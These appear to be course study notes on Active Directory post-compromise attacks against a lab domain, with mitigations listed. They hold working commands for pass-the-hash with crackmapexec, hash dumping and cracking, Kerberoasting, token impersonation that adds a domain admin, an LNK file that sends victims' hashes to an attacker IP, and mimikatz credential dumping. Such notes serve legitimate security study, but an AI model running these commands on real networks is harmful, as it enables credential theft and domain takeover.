## Pass Attacks 
- Also know as Pass the Password or Pass the Hash
- Which hash can be used in a pass-the-hash attack? -- NTLM
- If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks.
- `crackmapexec smb 10.0.0.0/24 -u pparker -d MARVEL.local -p passw0rd@123`
- `crackmapexec smb 10.0.0.0/24  -u administrator -H [hash] --local-auth`
- `crackmapexec smb 10.0.0.0/24  -u administrator -H [hash] --local-auth --sam` -- dumps the sam for every devices we log into
- `crackmapexec smb 10.0.0.0/24  -u administrator -H [hash] --local-auth --shares` --- enum the shares
- `crackmapexec smb 10.0.0.0/24  -u administrator -H [hash] --local-auth -M lsassy`
- `cmedb` -- crackmapexec database
######   Dumping and Cracking Hashes
- `secretsdump.py MARVEL.local/pparker:'passw0rd@123'@10.0.2.14` 
- `secretsdump.py administrator:@10.0.2.14 -hashes [hash]` 
- use hashcat or john the ripper for password cracking (only paste LM NT:LM)
	- `hashcat -m 1000 hash.txt /home/anurag/Downloads/rockyou.txt`
###### Mitigation
- Limit account re-use:
	- Avoid re-use local admin password
	-  Disable Guest and Administrator accounts
	- Limit who is a local administrator (Least Privileges)
- Utilize strong passwords
	- The longer the better (>14 characters)
	- Avoid using common words
- Privilege Access Management (PAM)
	- Check out/in sensitive accounts when needed
	- Automatically rotate passwords on check out and check in
	- Limits pass attacks as hash/password is strong and constantly rotated

## Kerberoasting 
![[Kerberoasting.png]]
- If we have domain credential of any kind that are valid, we can request a TGT (Ticket Granting Ticket)
- `sudo GetUserSPNs.py MARVEL.local/tstark:'passw0rd@123' -dc-ip 10.0.2.15 -request`
- It will give service accounts and their hashes
- `hashcat -m 13100 krt.txt /home/anurag/Downloads/rockyou.txt`
###### Mitigation
- Strong Passwords
- Least Privileges -- meaning your service account should not be running as domain admin
- Should not store password in your AD description

## Token Impersonation
- What Tokens are?
	- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
- Two Types:
	- **Delegate** -- Created for logging into a machine or using emote Desktop
	- **Impersonate** -- "non-interactive" such as attaching a network drive or a domain logon script
- msfconsole
	- `use exploit/windows/smb/psexec`
	- `load incognito` -- load after we get meterpreter session
	- `list_tokens -u` -- to list user account access tokens
	- `impersonate_token "[TOKEN NAME]"` (impersonate_token marvel\\tstark)
	- `rev2self` -- to get back to previous authorty
	- `net user /add hawkeye Password@1 /domain` -- to add the user as domain (once you have access to domain admin)
	- `net group "Domain Admins" hawkeye /ADD /DOMAIN` -- to add that user as domain admin
###### Mitigation
- Limit user/group token creation permission
- Account tiering
- Local admin restriction

##   LNK File Attacks
- Open powershell with administrator on target machine and type:
	- $objShell = New-Object -ComObject WScript.shell 
	- $lnk = $objShell.CreateShortcut("C:\test.lnk") 
	- $lnk.TargetPath = "\\[YOUR IP]\@test.png" 
	- $lnk.WindowStyle = 1 
	- $lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
	- $lnk.Description = "Test" 
	- $lnk.HotKey = "Ctrl+Alt+T" 
	- $lnk.Save()
	- and paste the file in hackme folder 
- Now start responder
- ` sudo responder -I eth0 -dPv`

##   GPP / cPassword Attacks and Mitigations
- It is old attack
- Group Policy Preference (GPP) allowed admins to create policies using embedded credentials
- These credentials were encrypted and placed in a "cPassword"
- The key was accidentally released (whoops)
- Patched in MS14-025, but it doesn't prevent previous uses
- STILL RELEVANT ON PENTESTS
###### Mitigation
- PATCH! fixed in  KB2962486
- In reality: delete the old GPP xml stored in SYSVOL

## Mimikatz (outside the scope of course)
- This will picked up by almost any sort of antivirus
- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
- Dump credentials stored in memory
- Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket, and Golden Ticket
- `sekurlsa::logonPasswods`


##   Post-Compromise Attack Strategy
- We have an account, now what?
- Search the quick wins
	- Kerberoasting
	- Secretsdump
	- Pass the hash/  pass the password
- No quick wins? Dig deep!
	- Enumerate (Bloodhound, etc.)
	- Where does your account have access?
	- Old vulnerabilities
- Think outside the box